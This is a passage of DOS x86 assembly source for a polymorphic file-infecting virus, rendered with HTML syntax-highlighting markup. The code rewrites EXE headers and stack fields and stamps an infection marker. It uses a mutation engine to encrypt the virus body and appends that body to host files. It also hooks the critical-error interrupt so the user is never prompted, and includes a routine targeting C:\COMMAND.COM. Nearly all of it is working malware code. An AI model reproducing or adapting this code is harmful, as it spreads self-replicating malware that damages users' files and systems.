</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  


</span><span class="sc1">;set the fucking stack</span><span class="sc0">
</span><span class="sc1">;if its inside the program leave it, else place it inside the virus code   </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get SP </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;ax holds the address of stack's head in paragraphs   </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">size1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">size1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">dontchangestack</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;SP</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;SS</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;SS</span><span class="sc0">
</span><span class="sc5">dontchangestack</span><span class="sc4">:</span><span class="sc0">     



</span><span class="sc1">;put my mark in the place of header Checksum</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0faceh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;writes header from memory to file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">;go to the beggining</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handler</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">            
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">              
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;write 84h </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handler</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">          
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">             
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">              </span><span class="sc1">;go at the end    </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">


</span><span class="sc1">;------POLY-------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;build the two buffers in ES:0 and DS:0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">BUFFERSIZE</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">splrand</span><span class="sc0">  </span><span class="sc1">;randomize SPL variables</span><span class="sc0">

</span><span class="sc1">;set some spl variables</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">EXi_IsCOM</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; set EXE type decryptors  </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startofvirusbody</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">EXi_VirusBodyStart</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; set the virusbody  offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endofvirusbody</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startofvirusbody</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">EXi_VirusBodyLength</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; set the virus lenght</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">;move the stack in a big,safe place</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldSS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldSP</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">

</span><span class="sc1">;call the engine</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">spldata</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">splvm</span><span class="sc0">     </span><span class="sc1">;build decryptor/encryptor</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">;move the stack back in place</span><span class="sc0">
</span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldSS</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldSP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sti</span><span class="sc0">


</span><span class="sc1">;patch the "mov bp,offset" instruction in the beggining of virus </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">EXo_EncryptedVirusBodyOffset</span><span class="sc4">]</span><span class="sc0">   
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">    
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;call the encryptor</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">returnencrypt</span><span class="sc4">]</span><span class="sc1">;push the return address</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;push the address of the encryptor</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc1">; set the source/destination segments</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0CBh</span><span class="sc0"> </span><span class="sc1">;return(?) to the encryptor</span><span class="sc0">
</span><span class="sc5">returnencrypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc1">;------POLY END-------</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">      
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">EXo_DecryptorStart</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">      
 
     
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">     </span><span class="sc1">; writes the encrypted virus to file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">handler</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">APPLYSIZE</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">       </span><span class="sc1">;    </span><span class="sc0">


</span><span class="sc1">;writes header from memory to file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">;go to the beggining </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">handler</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">            
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">              
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">;write 84h </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">handler</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">          
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">   
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">              </span><span class="sc1">;go at the end    </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">size1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">


</span><span class="sc5">close_file2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">           
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">handler</span><span class="sc4">]</span><span class="sc0">           
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos21</span><span class="sc0">           
</span><span class="sc5">cant_open2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;restore Host's entry-point of the current copy of virus. </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entrybackup</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entrybackup</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">entry</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;         </span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;_____________________________________________________________</span><span class="sc0">



</span><span class="sc1">;______________________________________________________________</span><span class="sc0">
</span><span class="sc1">;Old but good!!! </span><span class="sc0">
</span><span class="sc1">;________________________________</span><span class="sc0">
</span><span class="sc1">;replaces int21h with new24 handler</span><span class="sc0">
</span><span class="sc5">hook24</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">              
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">             
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">             
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">             
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">new24</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">              
    </span><span class="sc6">ret</span><span class="sc0">                 

</span><span class="sc1">;returns vector of int24 to its owner</span><span class="sc0">
</span><span class="sc5">unhook24</span><span class="sc4">:</span><span class="sc0">                   
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">             
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">old24</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">old24</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">              
    </span><span class="sc6">ret</span><span class="sc0">                 

</span><span class="sc1">;Special Interrupt 24h error handler which allways returns </span><span class="sc0">
</span><span class="sc1">; "(I)gnore" without asking the user.</span><span class="sc0">
</span><span class="sc5">new24</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc1">;DATA. Address of original Interrupt 24h handler</span><span class="sc0">
</span><span class="sc5">old24</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">



</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">
</span><span class="sc1">;Infect well known files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;_______________________________________________________________</span><span class="sc0">
</span><span class="sc5">infect_command</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">  </span><span class="sc1">;Sorry but win98 fucks everything. </span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">            

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">target2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">target1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">          </span><span class="sc1">;return();</span><span class="sc0">

</span><span class="sc1">;data</span><span class="sc0">
</span><span class="sc5">target1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\COMMAND.COM"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
